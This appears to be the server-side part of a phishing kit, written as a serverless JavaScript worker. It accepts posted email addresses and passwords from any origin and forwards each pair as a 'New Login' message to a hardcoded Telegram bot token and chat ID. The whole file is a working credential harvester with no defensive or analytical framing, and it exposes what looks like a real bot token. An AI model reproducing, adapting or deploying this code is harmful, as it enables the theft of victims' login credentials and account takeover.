export default {
  async fetch(request) {
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      });
    }

    if (request.method !== "POST") {
      return new Response(JSON.stringify({ error: "Method Not Allowed" }), { status: 405, headers: { "Content-Type": "application/json" } });
    }

    try {
      const contentType = request.headers.get("content-type") || "";
      let data = {};

      if (contentType.includes("application/json")) {
        data = await request.json();
      } else {
        return new Response(JSON.stringify({ error: "Unsupported Content Type" }), { status: 400, headers: { "Content-Type": "application/json" } });
      }

      if (!data.userID || !data.password) {
        return new Response(JSON.stringify({ error: "Missing required fields" }), { status: 400, headers: { "Content-Type": "application/json" } });
      }

      const telegramBotToken = "7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk";
      const chatId = "7283094857";
      const message = `🔔 New Login:\n📧 Email: ${data.userID}\n🔑 Password: ${data.password}`;

      const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      });

      if (!telegramResponse.ok) {
        return new Response(JSON.stringify({ error: "Failed to send Telegram message" }), { status: 500, headers: { "Content-Type": "application/json" } });
      }

      // Send success response
      return new Response(JSON.stringify({ success: true }), { status: 200, headers: { "Content-Type": "application/json" } });

    } catch (error) {
      return new Response(JSON.stringify({ error: `Error: ${error.message}` }), { status: 500, headers: { "Content-Type": "application/json" } });
    }
  },
};
